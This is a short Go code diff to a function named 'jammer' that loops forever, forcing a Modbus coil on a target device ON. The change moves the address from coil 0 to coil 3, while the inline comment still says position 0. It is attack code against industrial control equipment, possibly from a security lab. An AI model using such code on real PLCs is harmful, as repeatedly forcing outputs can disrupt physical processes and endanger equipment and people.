@@ -26,7 +26,7 @@ func init() {
 func jammer(target modbus.Client) {
 
 	for {
-		results, err := target.WriteSingleCoil(0, 0xFF00) //Writes a one to coil at position 0. 0xFF00 for 1 and 0x0000 for 0
+		results, err := target.WriteSingleCoil(3, 0xFF00) //Writes a one to coil at position 0. 0xFF00 for 1 and 0x0000 for 0
 
 		if err != nil {
 			fmt.Println(err)
